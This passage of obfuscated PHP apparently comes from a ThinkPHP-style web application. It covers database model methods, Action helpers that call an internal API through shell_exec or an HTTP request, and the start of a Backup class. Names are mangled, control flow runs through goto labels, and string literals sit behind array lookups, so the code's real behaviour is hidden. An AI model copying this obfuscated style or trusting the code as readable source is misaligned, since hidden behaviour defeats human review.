array_unshift($fÔ»ïêô˜ø, $bàšÌ²ÃøÚ[$A®—¯Àçà´[0]]); } if ($bÕø’ÀÉç[309] == $A®—¯Àçà´[3]) { $bàšÌ²ÃøÚ[$A®—¯Àçà´[0]] = call_user_func_array($A®—¯Àçà´[1], $fÔ»ïêô˜ø); } else { $bàšÌ²ÃøÚ[$A®—¯Àçà´[0]] = call_user_func_array(array(&$this, $A®—¯Àçà´[1]), $fÔ»ïêô˜ø); } break; case $bÕø’ÀÉç[261]: $bàšÌ²ÃøÚ[$A®—¯Àçà´[0]] = $bàšÌ²ÃøÚ[$A®—¯Àçà´[1]]; break; case $bÕø’ÀÉç[311]: if ($bÕø’ÀÉç[33] === $bàšÌ²ÃøÚ[$A®—¯Àçà´[0]]) { unset($bàšÌ²ÃøÚ[$A®—¯Àçà´[0]]); } break; case $bÕø’ÀÉç[312]: default: $bàšÌ²ÃøÚ[$A®—¯Àçà´[0]] = $A®—¯Àçà´[1]; } if (!1 === $bàšÌ²ÃøÚ[$A®—¯Àçà´[0]]) { unset($bàšÌ²ÃøÚ[$A®—¯Àçà´[0]]); } } } } return $bàšÌ²ÃøÚ; } protected function autoValidation($B¤í±’ÖÖ¼, $B×‘Á½¹õ‚) { $d…½Ïª·Î =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!empty($this->options[$d…½Ïª·Î[313]])) { $AËà³¶ÄŠá = $this->options[$d…½Ïª·Î[313]]; unset($this->options[$d…½Ïª·Î[313]]); } elseif (!empty($this->_validate)) { $AËà³¶ÄŠá = $this->_validate; } if (isset($AËà³¶ÄŠá)) { if ($this->patchValidate) { $this->error = array(); } foreach ($AËà³¶ÄŠá as $D¿´ƒ…¾ˆ‡ => $aŒ°óâÀšõ) { if (empty($aŒ°óâÀšõ[5]) || $aŒ°óâÀšõ[5] == THINK_MODEL_BOTH || $aŒ°óâÀšõ[5] == $B×‘Á½¹õ‚) { if (0 == strpos($aŒ°óâÀšõ[2], $d…½Ïª·Î[314]) && strpos($aŒ°óâÀšõ[2], $d…½Ïª·Î[315])) { $aŒ°óâÀšõ[2] = think_lang(substr($aŒ°óâÀšõ[2], 2, -1)); } $aŒ°óâÀšõ[3] = isset($aŒ°óâÀšõ[3]) ? $aŒ°óâÀšõ[3] : THINK_EXISTS_VALIDATE; $aŒ°óâÀšõ[4] = isset($aŒ°óâÀšõ[4]) ? $aŒ°óâÀšõ[4] : $d…½Ïª·Î[316]; switch ($aŒ°óâÀšõ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($B¤í±’ÖÖ¼, $aŒ°óâÀšõ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($d…½Ïª·Î[33] != trim($B¤í±’ÖÖ¼[$aŒ°óâÀšõ[0]])) { if (!1 === $this->_validationField($B¤í±’ÖÖ¼, $aŒ°óâÀšõ)) { return !1; } } break; default: if (isset($B¤í±’ÖÖ¼[$aŒ°óâÀšõ[0]])) { if (!1 === $this->_validationField($B¤í±’ÖÖ¼, $aŒ°óâÀšõ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($c¿ö·¡¹Â, $EæÂŒ†ƒ“¤) { if (!1 === $this->_validationFieldItem($c¿ö·¡¹Â, $EæÂŒ†ƒ“¤)) { if ($this->patchValidate) { $this->error[$EæÂŒ†ƒ“¤[0]] = $EæÂŒ†ƒ“¤[2]; } else { $this->error = $EæÂŒ†ƒ“¤[2]; return !1; } } return; } protected function _validationFieldItem($C›Ä¬»Ñ, $F—†¦‚™·É) { $D®ßíÔ‡†è =& $_SERVER[³‘’¼äÑ™ÔÍ]; switch (strtolower(trim($F—†¦‚™·É[4]))) { case $D®ßíÔ‡†è[309]: case $D®ßíÔ‡†è[310]: $AàŠ½ôØ™ = isset($F—†¦‚™·É[6]) ? (array) $F—†¦‚™·É[6] : array(); if (is_string($F—†¦‚™·É[0]) && strpos($F—†¦‚™·É[0], $D®ßíÔ‡†è[47])) { $F—†¦‚™·É[0] = explode($D®ßíÔ‡†è[47], $F—†¦‚™·É[0]); } if (is_array($F—†¦‚™·É[0])) { foreach ($F—†¦‚™·É[0] as $Aã†ĞØ‡•¸) { $EŠî–©ƒ¦º[$Aã†ĞØ‡•¸] = $C›Ä¬»Ñ[$Aã†ĞØ‡•¸]; } array_unshift($AàŠ½ôØ™, $EŠî–©ƒ¦º); } else { array_unshift($AàŠ½ôØ™, $C›Ä¬»Ñ[$F—†¦‚™·É[0]]); } if ($D®ßíÔ‡†è[309] == $F—†¦‚™·É[4]) { return call_user_func_array($F—†¦‚™·É[1], $AàŠ½ôØ™); } else { return call_user_func_array(array(&$this, $F—†¦‚™·É[1]), $AàŠ½ôØ™); } case $D®ßíÔ‡†è[317]: return $C›Ä¬»Ñ[$F—†¦‚™·É[0]] == $C›Ä¬»Ñ[$F—†¦‚™·É[1]]; case $D®ßíÔ‡†è[318]: if (is_string($F—†¦‚™·É[0]) && strpos($F—†¦‚™·É[0], $D®ßíÔ‡†è[47])) { $F—†¦‚™·É[0] = explode($D®ßíÔ‡†è[47], $F—†¦‚™·É[0]); } $Eí„¾•«„ò = array(); if (is_array($F—†¦‚™·É[0])) { foreach ($F—†¦‚™·É[0] as $Aã†ĞØ‡•¸) { $Eí„¾•«„ò[$Aã†ĞØ‡•¸] = $C›Ä¬»Ñ[$Aã†ĞØ‡•¸]; } } else { $Eí„¾•«„ò[$F—†¦‚™·É[0]] = $C›Ä¬»Ñ[$F—†¦‚™·É[0]]; } if (!empty($C›Ä¬»Ñ[$this->getPk()])) { $Eí„¾•«„ò[$this->getPk()] = array($D®ßíÔ‡†è[319], $C›Ä¬»Ñ[$this->getPk()]); } if ($this->where($Eí„¾•«„ò)->find()) { return !1; } return !0; default: return $this->check($C›Ä¬»Ñ[$F—†¦‚™·É[0]], $F—†¦‚™·É[1], $F—†¦‚™·É[4]); } } public function check($D¿ÃŠÇ²Ğ, $B©Î¥ˆ“·å, $EßËŞæÏ×ª = "\x72\145\147\x65\x78") { $FÖ¢ï¸Í’ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $EßËŞæÏ×ª = strtolower(trim($EßËŞæÏ×ª)); switch ($EßËŞæÏ×ª) { case $FÖ¢ï¸Í’[7]: case $FÖ¢ï¸Í’[320]: $a†©¼ô› = is_array($B©Î¥ˆ“·å) ? $B©Î¥ˆ“·å : explode($FÖ¢ï¸Í’[47], $B©Î¥ˆ“·å); return $EßËŞæÏ×ª == $FÖ¢ï¸Í’[7] ? in_array($D¿ÃŠÇ²Ğ, $a†©¼ô›) : !in_array($D¿ÃŠÇ²Ğ, $a†©¼ô›); case $FÖ¢ï¸Í’[321]: case $FÖ¢ï¸Í’[322]: if (is_array($B©Î¥ˆ“·å)) { $eÕÖ®ô¨ŸÏ = $B©Î¥ˆ“·å[0]; $AÚ´ğ•Ùö‰ = $B©Î¥ˆ“·å[1]; } else { list($eÕÖ®ô¨ŸÏ, $AÚ´ğ•Ùö‰) = explode($FÖ¢ï¸Í’[47], $B©Î¥ˆ“·å); } return $EßËŞæÏ×ª == $FÖ¢ï¸Í’[321] ? $D¿ÃŠÇ²Ğ >= $eÕÖ®ô¨ŸÏ && $D¿ÃŠÇ²Ğ <= $AÚ´ğ•Ùö‰ : $D¿ÃŠÇ²Ğ < $eÕÖ®ô¨ŸÏ || $D¿ÃŠÇ²Ğ > $AÚ´ğ•Ùö‰; case $FÖ¢ï¸Í’[323]: case $FÖ¢ï¸Í’[324]: return $EßËŞæÏ×ª == $FÖ¢ï¸Í’[323] ? $D¿ÃŠÇ²Ğ == $B©Î¥ˆ“·å : $D¿ÃŠÇ²Ğ != $B©Î¥ˆ“·å; case $FÖ¢ï¸Í’[325]: $B‚’§Æ’£Û = mb_strlen($D¿ÃŠÇ²Ğ, $FÖ¢ï¸Í’[326]); if (strpos($B©Î¥ˆ“·å, $FÖ¢ï¸Í’[47])) { list($eÕÖ®ô¨ŸÏ, $AÚ´ğ•Ùö‰) = explode($FÖ¢ï¸Í’[47], $B©Î¥ˆ“·å); return $B‚’§Æ’£Û >= $eÕÖ®ô¨ŸÏ && $B‚’§Æ’£Û <= $AÚ´ğ•Ùö‰; } else { return $B‚’§Æ’£Û == $B©Î¥ˆ“·å; } case $FÖ¢ï¸Í’[327]: list($A§£ñ­…ªä, $EÑÖ«ô•”) = explode($FÖ¢ï¸Í’[47], $B©Î¥ˆ“·å); if (!is_numeric($A§£ñ­…ªä)) { $A§£ñ­…ªä = strtotime($A§£ñ­…ªä); } if (!is_numeric($EÑÖ«ô•”)) { $EÑÖ«ô•” = strtotime($EÑÖ«ô•”); } return NOW_TIME >= $A§£ñ­…ªä && NOW_TIME <= $EÑÖ«ô•”; case $FÖ¢ï¸Í’[328]: return in_array(get_client_ip(), explode($FÖ¢ï¸Í’[47], $B©Î¥ˆ“·å)); case $FÖ¢ï¸Í’[329]: return !in_array(get_client_ip(), explode($FÖ¢ï¸Í’[47], $B©Î¥ˆ“·å)); case $FÖ¢ï¸Í’[316]: default: return $this->regex($D¿ÃŠÇ²Ğ, $B©Î¥ˆ“·å); } } public function query($F÷Ûª½ßõ, $A˜ÕŠïš = false) { $eôòêÂäˆ„ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!is_bool($A˜ÕŠïš) && !is_array($A˜ÕŠïš)) { $A˜ÕŠïš = func_get_args(); array_shift($A˜ÕŠïš); } $F÷Ûª½ßõ = str_replace(array($eôòêÂäˆ„[217], $eôòêÂäˆ„[330]), $eôòêÂäˆ„[50], $F÷Ûª½ßõ); $F÷Ûª½ßõ = $this->parseSql($F÷Ûª½ßõ, $A˜ÕŠïš); return $this->db->query($F÷Ûª½ßõ); } public function execute($E‘ÌÛƒİä›, $Bê÷ä²‹¯‹ = false) { if (!is_bool($Bê÷ä²‹¯‹) && !is_array($Bê÷ä²‹¯‹)) { $Bê÷ä²‹¯‹ = func_get_args(); array_shift($Bê÷ä²‹¯‹); } $E‘ÌÛƒİä› = $this->parseSql($E‘ÌÛƒİä›, $Bê÷ä²‹¯‹); return $this->db->execute($E‘ÌÛƒİä›); } protected function parseSql($dä‹®º×ÁÖ, $EâõøŒóæ) { $AæÊÔ‹ÊÇï =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!0 === $EâõøŒóæ) { $Båˆµ¯‹Ğ› = $this->_parseOptions(); $dä‹®º×ÁÖ = $this->db->parseSql($dä‹®º×ÁÖ, $Båˆµ¯‹Ğ›); } elseif (is_array($EâõøŒóæ)) { $EâõøŒóæ = array_map(array($this->db, $AæÊÔ‹ÊÇï[331]), $EâõøŒóæ); $dä‹®º×ÁÖ = vsprintf($dä‹®º×ÁÖ, $EâõøŒóæ); } else { $dä‹®º×ÁÖ = strtr($dä‹®º×ÁÖ, array($AæÊÔ‹ÊÇï[332] => $this->getTableName(), $AæÊÔ‹ÊÇï[333] => think_config($AæÊÔ‹ÊÇï[232]))); } $this->db->setModel($this->name); return $dä‹®º×ÁÖ; } public function db($b£ŠÚ½à‹‘ = '', $Fòñ¦º‹×¯ = '', $dô¤¡ĞÕÂ‹ = array()) { goto e‹Ã¿øï†Ç; B¿¶©òÙàª: static $d³ÌÅãÆ½  = array(); if (!isset($d³ÌÅãÆ½ [$b£ŠÚ½à‹‘]) || isset($d³ÌÅãÆ½ [$b£ŠÚ½à‹‘]) && $Fòñ¦º‹×¯ && $c˜¸—Öò[$b£ŠÚ½à‹‘] != $Fòñ¦º‹×¯) { if (!empty($Fòñ¦º‹×¯) && is_string($Fòñ¦º‹×¯) && !1 === strpos($Fòñ¦º‹×¯, $cë·µ‰…¢[8])) { $Fòñ¦º‹×¯ = think_config($Fòñ¦º‹×¯); } $d³ÌÅãÆ½ [$b£ŠÚ½à‹‘] = Db::getInstance($Fòñ¦º‹×¯); } elseif (NULL === $Fòñ¦º‹×¯) { $d³ÌÅãÆ½ [$b£ŠÚ½à‹‘]->close(); unset($d³ÌÅãÆ½ [$b£ŠÚ½à‹‘]); return; } if (!empty($dô¤¡ĞÕÂ‹)) { if (is_string($dô¤¡ĞÕÂ‹)) { parse_str($dô¤¡ĞÕÂ‹, $dô¤¡ĞÕÂ‹); } foreach ($dô¤¡ĞÕÂ‹ as $BˆĞ†î¨“¼ => $F‘æÍÀîÌ´) { $this->setProperty($BˆĞ†î¨“¼, $F‘æÍÀîÌ´); } } goto d–×¨È½¢æ; E¸”ƒ–êÌÁ: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto E§®§ì´ùÉ; d–×¨È½¢æ: $c˜¸—Öò[$b£ŠÚ½à‹‘] = $Fòñ¦º‹×¯; $this->db = $d³ÌÅãÆ½ [$b£ŠÚ½à‹‘]; $this->_after_db(); goto E¸”ƒ–êÌÁ; e‹Ã¿øï†Ç: $cë·µ‰…¢ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($cë·µ‰…¢[33] === $b£ŠÚ½à‹‘ && $this->db) { return $this->db; } static $c˜¸—Öò = array(); goto B¿¶©òÙàª; E§®§ì´ùÉ: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $eÑØöêÇÊ¤ = get_class($this); if ($eÑØöêÇÊ¤ == $_SERVER[³‘’¼äÑ™ÔÍ][334]) { return $this->name; } $this->name = substr($eÑØöêÇÊ¤, 0, -5); } return $this->name; } public function getTableName() { $e“èËªİÒ° =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (empty($this->trueTableName)) { $c¾öè¶í¥Ğ = !empty($this->tablePrefix) ? $this->tablePrefix : $e“èËªİÒ°[33]; if (!empty($this->tableName)) { $c¾öè¶í¥Ğ .= $this->tableName; } else { $c¾öè¶í¥Ğ .= think_parse_name($this->name); } $this->trueTableName = strtolower($c¾öè¶í¥Ğ); } return (!empty($this->dbName) ? $this->dbName . $e“èËªİÒ°[91] : $e“èËªİÒ°[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Eš¬ƒ¯¦±¡ =& $_SERVER[³‘’¼äÑ™ÔÍ]; return isset($this->fields[$Eš¬ƒ¯¦±¡[239]]) ? $this->fields[$Eš¬ƒ¯¦±¡[239]] : $this->pk; } public function getDbFields() { $aìŠÈéø =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (isset($this->options[$aìŠÈéø[267]])) { $A‰£Ôó÷‹à = $this->db->getFields($this->options[$aìŠÈéø[267]]); return $A‰£Ôó÷‹à ? array_keys($A‰£Ôó÷‹à) : !1; } if ($this->fields) { $A‰£Ôó÷‹à = $this->fields; unset($A‰£Ôó÷‹à[$aìŠÈéø[238]], $A‰£Ôó÷‹à[$aìŠÈéø[239]], $A‰£Ôó÷‹à[$aìŠÈéø[240]], $A‰£Ôó÷‹à[$aìŠÈéø[237]]); return $A‰£Ôó÷‹à; } return !1; } public function data($CôçäÓ·Ñ‹ = '') { $càìØÜî´ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($càìØÜî´[33] === $CôçäÓ·Ñ‹ && !empty($this->data)) { return $this->data; } if (is_object($CôçäÓ·Ñ‹)) { $CôçäÓ·Ñ‹ = get_object_vars($CôçäÓ·Ñ‹); } elseif (is_string($CôçäÓ·Ñ‹)) { parse_str($CôçäÓ·Ñ‹, $CôçäÓ·Ñ‹); } elseif (!is_array($CôçäÓ·Ñ‹)) { think_exception(think_lang($càìØÜî´[259])); } $this->data = $CôçäÓ·Ñ‹; return $this; } public function join($c–öÓ¤õÊ) { $e“Ÿ—´­ÈÁ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (is_array($c–öÓ¤õÊ)) { $this->options[$e“Ÿ—´­ÈÁ[270]] = $c–öÓ¤õÊ; } elseif (!empty($c–öÓ¤õÊ)) { $this->options[$e“Ÿ—´­ÈÁ[270]][] = $c–öÓ¤õÊ; } return $this; } public function union($Fˆ—À·™, $cë„óÍ³ñ‚ = false) { goto aÜôÇÜ«¼Ô; b¬ó‰°Ø‘°: if (is_object($Fˆ—À·™)) { $Fˆ—À·™ = get_object_vars($Fˆ—À·™); } if (is_string($Fˆ—À·™)) { $EèÉÑ½Ç•Ä = $Fˆ—À·™; } elseif (is_array($Fˆ—À·™)) { if (isset($Fˆ—À·™[0])) { $this->options[$B‚ìµî¬ª[335]] = array_merge($this->options[$B‚ìµî¬ª[335]], $Fˆ—À·™); return $this; } else { $EèÉÑ½Ç•Ä = $Fˆ—À·™; } } else { think_exception(think_lang($B‚ìµî¬ª[259])); } $this->options[$B‚ìµî¬ª[335]][] = $EèÉÑ½Ç•Ä; goto aÈºïëªò; aÜôÇÜ«¼Ô: $B‚ìµî¬ª =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (empty($Fˆ—À·™)) { return $this; } if ($cë„óÍ³ñ‚) { $this->options[$B‚ìµî¬ª[335]][$B‚ìµî¬ª[336]] = !0; } goto b¬ó‰°Ø‘°; aÈºïëªò: return $this; goto dóä‹íòó; dóä‹íòó: } public function cache($e¾‹òøŞõ = true, $E‰”Š±Ğ«÷ = null, $Eá˜ ‹­– = '') { $F¶Š„äµº× =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!1 !== $e¾‹òøŞõ) { $this->options[$F¶Š„äµº×[337]] = array($F¶Š„äµº×[89] => $e¾‹òøŞõ, $F¶Š„äµº×[327] => $E‰”Š±Ğ«÷, $F¶Š„äµº×[29] => $Eá˜ ‹­–); } return $this; } public function field($fìÈ¨††Œ†, $Cáì°¿äÊ° = false) { $aª·İ¿¸ÇÍ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!0 === $fìÈ¨††Œ†) { $c‹…’‘ë‡ = $this->getDbFields(); $fìÈ¨††Œ† = $c‹…’‘ë‡ ? $c‹…’‘ë‡ : $aª·İ¿¸ÇÍ[176]; } elseif ($Cáì°¿äÊ°) { if (is_string($fìÈ¨††Œ†)) { $fìÈ¨††Œ† = explode($aª·İ¿¸ÇÍ[47], $fìÈ¨††Œ†); } $c‹…’‘ë‡ = $this->getDbFields(); $fìÈ¨††Œ† = $c‹…’‘ë‡ ? array_diff($c‹…’‘ë‡, $fìÈ¨††Œ†) : $fìÈ¨††Œ†; } $this->options[$aª·İ¿¸ÇÍ[261]] = $fìÈ¨††Œ†; return $this; } public function scope($B…¬ÓÊÌä¤ = '', $AµÊÉùîßœ = NULL) { $AÕ¾² ®¤ø =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($AÕ¾² ®¤ø[33] === $B…¬ÓÊÌä¤) { if (isset($this->_scope[$AÕ¾² ®¤ø[34]])) { $Fìë‘Š¸ƒ™ = $this->_scope[$AÕ¾² ®¤ø[34]]; } else { return $this; } } elseif (is_string($B…¬ÓÊÌä¤)) { $B•ÃÆ‘¹³Ÿ = explode($AÕ¾² ®¤ø[47], $B…¬ÓÊÌä¤); $Fìë‘Š¸ƒ™ = array(); foreach ($B•ÃÆ‘¹³Ÿ as $b–À›ÕøÛç) { if (!isset($this->_scope[$b–À›ÕøÛç])) { continue; } $Fìë‘Š¸ƒ™ = array_merge($Fìë‘Š¸ƒ™, $this->_scope[$b–À›ÕøÛç]); } if (!empty($AµÊÉùîßœ) && is_array($AµÊÉùîßœ)) { $Fìë‘Š¸ƒ™ = array_merge($Fìë‘Š¸ƒ™, $AµÊÉùîßœ); } } elseif (is_array($B…¬ÓÊÌä¤)) { $Fìë‘Š¸ƒ™ = $B…¬ÓÊÌä¤; } if (is_array($Fìë‘Š¸ƒ™) && !empty($Fìë‘Š¸ƒ™)) { $this->options = array_merge($this->options, array_change_key_case($Fìë‘Š¸ƒ™)); } return $this; } public function where($açùÛõŒ»á, $BùóšÉôÕĞ = null) { $cç‹µ±õ… =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!is_null($BùóšÉôÕĞ) && is_string($açùÛõŒ»á)) { if (!is_array($BùóšÉôÕĞ)) { $BùóšÉôÕĞ = func_get_args(); array_shift($BùóšÉôÕĞ); } $BùóšÉôÕĞ = array_map(array($this->db, $cç‹µ±õ…[331]), $BùóšÉôÕĞ); $açùÛõŒ»á = vsprintf($açùÛõŒ»á, $BùóšÉôÕĞ); } elseif (is_object($açùÛõŒ»á)) { $açùÛõŒ»á = get_object_vars($açùÛõŒ»á); } elseif (is_array($açùÛõŒ»á)) { foreach ($açùÛõŒ»á as $FªÛš“¦³¸ => $DÑ§‡‹ÈŞ) { if ((is_numeric($FªÛš“¦³¸) || !$FªÛš“¦³¸) && is_string($DÑ§‡‹ÈŞ)) { think_trace($cç‹µ±õ…[338], $cç‹µ±õ…[33], $cç‹µ±õ…[46]); die; } } } if (is_string($açùÛõŒ»á) && $cç‹µ±õ…[33] != $açùÛõŒ»á) { $D§ÖÅÇ‘‡Ù = array(); $D§ÖÅÇ‘‡Ù[$cç‹µ±õ…[339]] = $açùÛõŒ»á; $açùÛõŒ»á = $D§ÖÅÇ‘‡Ù; } if (isset($this->options[$cç‹µ±õ…[263]])) { $this->options[$cç‹µ±õ…[263]] = array_merge($this->options[$cç‹µ±õ…[263]], $açùÛõŒ»á); } else { $this->options[$cç‹µ±õ…[263]] = $açùÛõŒ»á; } return $this; } public function limit($Dµ¬íÜ˜³Ş, $cŠİÀÃ¥“• = null) { $bÔšğøÈ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->options[$bÔšğøÈ[280]] = is_null($cŠİÀÃ¥“•) ? $Dµ¬íÜ˜³Ş : $Dµ¬íÜ˜³Ş . $bÔšğøÈ[47] . $cŠİÀÃ¥“•; return $this; } public function page($cöƒšö¹, $C÷åá Œ›Ù = null) { $f¼ËÚğ¤¦× =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->options[$f¼ËÚğ¤¦×[340]] = is_null($C÷åá Œ›Ù) ? $cöƒšö¹ : $cöƒšö¹ . $f¼ËÚğ¤¦×[47] . $C÷åá Œ›Ù; return $this; } public function comment($E‰çõƒåÓç) { $this->options[$_SERVER[³‘’¼äÑ™ÔÍ][341]] = $E‰çõƒåÓç; return $this; } public function setProperty($Cë£Ø¥áøë, $fÃÏ•‘Ú†) { if (property_exists($this, $Cë£Ø¥áøë)) { $this->{$Cë£Ø¥áøë} = $fÃÏ•‘Ú†; } return $this; } } goto FÀ°ÂÁåæ; dÅ¯‚«ÍîŞ: function ActionCall($fĞ˜¾ìçˆÇ) { $BŸ‰«Õ´© = array_slice(func_get_args(), 1); return ActionApply($fĞ˜¾ìçˆÇ, $BŸ‰«Õ´©); } function ActionCallApi($b¿¤„ØİÏƒ, $eôÓ¨ìêâ = '') { goto bŞ„Œİ£æ; eó¦‚÷â«: $BÓ×’ÏÕå‹ = json_decode($Eï“Ç¹èÉ», !0); $Bƒš†âØä¥ = is_array($BÓ×’ÏÕå‹) ? $BÓ×’ÏÕå‹ : array($bó¿Î¢Üí[33] => null, $bó¿Î¢Üí[34] => $Eï“Ç¹èÉ»); if (!$BÓ×’ÏÕå‹) { echo $Eï“Ç¹èÉ»; } goto f‡‡Â¡Õ; f›ùà¡×ïé: $b‹Ìéîç· = Action($bó¿Î¢Üí[23])->accessToken(); $b¿¤„ØİÏƒ = str_replace($bó¿Î¢Üí[5], $bó¿Î¢Üí[4], $b¿¤„ØİÏƒ) . $bó¿Î¢Üí[24] . $b‹Ìéîç· . $CÂÈ“—Àİã; $Eï“Ç¹èÉ» = $bó¿Î¢Üí[20]; goto FÎÛ—›ó; f‡‡Â¡Õ: return $Bƒš†âØä¥; goto b©‚ÖÇÓ®À; bŞ„Œİ£æ: $bó¿Î¢Üí =& $_SERVER[Êß·®ÍËúû]; $CÂÈ“—Àİã = $eôÓ¨ìêâ; if (is_array($eôÓ¨ìêâ)) { $CÂÈ“—Àİã = $bó¿Î¢Üí[20]; foreach ($eôÓ¨ìêâ as $eŞåòÕ¾‡” => $b¬”ˆáøÕî) { $b¬”ˆáøÕî = is_array($b¬”ˆáøÕî) ? json_encode($b¬”ˆáøÕî) : $b¬”ˆáøÕî; $b¬”ˆáøÕî = is_bool($b¬”ˆáøÕî) ? intval($b¬”ˆáøÕî) : $b¬”ˆáøÕî; $CÂÈ“—Àİã .= $bó¿Î¢Üí[21] . $eŞåòÕ¾‡” . $bó¿Î¢Üí[22] . rawurlencode($b¬”ˆáøÕî); } } goto f›ùà¡×ïé; FÎÛ—›ó: $bÒà…îœäÙ = phpBinCommand(); if ($bÒà…îœäÙ && function_exists($bó¿Î¢Üí[25])) { $b Ğ‚¦ó™ = $bÒà…îœäÙ . $bó¿Î¢Üí[26] . BASIC_PATH . $bó¿Î¢Üí[27] . escapeshellarg($b¿¤„ØİÏƒ); $Eï“Ç¹èÉ» = shell_exec($b Ğ‚¦ó™); } if (!$Eï“Ç¹èÉ») { $BÛ›èÃˆá = stream_context_create(array($bó¿Î¢Üí[28] => array($bó¿Î¢Üí[29] => 20, $bó¿Î¢Üí[30] => $bó¿Î¢Üí[31]))); $Eï“Ç¹èÉ» = file_get_contents(APP_HOST . $bó¿Î¢Üí[32] . $b¿¤„ØİÏƒ, !1, $BÛ›èÃˆá); } goto eó¦‚÷â«; b©‚ÖÇÓ®À: } function ActionCallHook($B¡ŠÑÆÙÔÉ) { goto D†Œ´–ƒŸ¹; dåãÃÕíÍï: $F·´ğÈ±Ğ” = $b¹òÃÜèÊ ? json_decode($b¹òÃÜèÊ, !0) : $F·´ğÈ±Ğ”; $GLOBALS[$d‰ìºãÇ£‡[35]] = 0; return $F·´ğÈ±Ğ”; goto E¨±ê—ğŒº; D†Œ´–ƒŸ¹: $d‰ìºãÇ£‡ =& $_SERVER[Êß·®ÍËúû]; ob_start(); $E÷íšƒÉ—İ = array_slice(func_get_args(), 1); goto d®ïîíŞ†; d®ïîíŞ†: $GLOBALS[$d‰ìºãÇ£‡[35]] = 1; $F·´ğÈ±Ğ” = ActionApply($B¡ŠÑÆÙÔÉ, $E÷íšƒÉ—İ); $b¹òÃÜèÊ = ob_get_clean(); goto dåãÃÕíÍï; E¨±ê—ğŒº: } goto dï²¼ˆãŸÁ; A•™ğî¸Í³: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $cğÁÏ‡º–î =& $_SERVER[³‘’¼äÑ™ÔÍ]; self::$name = date($cğÁÏ‡º–î[690]); if (!($cß©Î¹†æ° = Model($cğÁÏ‡º–î[691])->lastItem())) { $cß©Î¹†æ° = $this->initData(); } else { self::$name = $cß©Î¹†æ°[$cğÁÏ‡º–î[28]]; if ($cß©Î¹†æ°[$cğÁÏ‡º–î[692]] == $cğÁÏ‡º–î[83]) { self::$name = date($cğÁÏ‡º–î[693]); $b¿ÒºÓÊî¾ = 0; if (isset($cß©Î¹†æ°[$cğÁÏ‡º–î[281]][$cğÁÏ‡º–î[167]][$cğÁÏ‡º–î[419]])) { $b¿ÒºÓÊî¾ = (int) $cß©Î¹†æ°[$cğÁÏ‡º–î[281]][$cğÁÏ‡º–î[167]][$cğÁÏ‡º–î[419]]; } if ($cß©Î¹†æ°[$cğÁÏ‡º–î[28]] == self::$name) { Model($cğÁÏ‡º–î[691])->remove($cß©Î¹†æ°[$cğÁÏ‡º–î[367]]); } $cß©Î¹†æ° = $this->initData($b¿ÒºÓÊî¾, $cß©Î¹†æ°[$cğÁÏ‡º–î[694]]); } else { $this->checkStore($cß©Î¹†æ°[$cğÁÏ‡º–î[694]]); } } self::$option = $cß©Î¹†æ°; } private function initData($Aã•–ß”º = 0, $E•Úğ÷®Êô = '') { goto A«ÕáàìœÎ; EäÙä‘”êÆ: $d¢„²…‰øÇ[$f‚’¸ã‚Ú[367]] = $E®ƒğ¦Ç®; return $d¢„²…‰øÇ; goto aïŞ¦±×£‰; A«ÕáàìœÎ: $f‚’¸ã‚Ú =& $_SERVER[³‘’¼äÑ™ÔÍ]; $cÏùŠ‹öÚå = Model($f‚’¸ã‚Ú[691])->config(); if ($E•Úğ÷®Êô && $cÏùŠ‹öÚå[$f‚’¸ã‚Ú[694]] != $E•Úğ÷®Êô) { $Aã•–ß”º = 0; } goto CÚîğ±³ã; CÚîğ±³ã: $this->checkStore($cÏùŠ‹öÚå[$f‚’¸ã‚Ú[694]]); $d¢„²…‰øÇ = array($f‚’¸ã‚Ú[694] => $cÏùŠ‹öÚå[$f‚’¸ã‚Ú[694]], $f‚’¸ã‚Ú[28] => self::$name, $f‚’¸ã‚Ú[692] => 0, $f‚’¸ã‚Ú[695] => $cÏùŠ‹öÚå[$f‚’¸ã‚Ú[695]], $f‚’¸ã‚Ú[281] => array($f‚’¸ã‚Ú[696] => array($f‚’¸ã‚Ú[692] => 0), $f‚’¸ã‚Ú[697] => array($f‚’¸ã‚Ú[692] => 0, $f‚’¸ã‚Ú[698] => 0, $f‚’¸ã‚Ú[699] => 0, $f‚’¸ã‚Ú[29] => $f‚’¸ã‚Ú[33]), $f‚’¸ã‚Ú[700] => array($f‚’¸ã‚Ú[692] => 0, $f‚’¸ã‚Ú[698] => 0, $f‚’¸ã‚Ú[699] => 0), $f‚’¸ã‚Ú[167] => array($f‚’¸ã‚Ú[692] => 0, $f‚’¸ã‚Ú[701] => 0, $f‚’¸ã‚Ú[702] => 0, $f‚’¸ã‚Ú[703] => 0, $f‚’¸ã‚Ú[704] => 0, $f‚’¸ã‚Ú[419] => $Aã•–ß”º)), $f‚’¸ã‚Ú[705] => time(), $f‚’¸ã‚Ú[706] => 0); $E®ƒğ¦Ç® = Model($f‚’¸ã‚Ú[691])->insert($d¢„²…‰øÇ); goto EäÙä‘”êÆ; aïŞ¦±×£‰: } private function checkStore($c®‘´Ó–Å¶) { 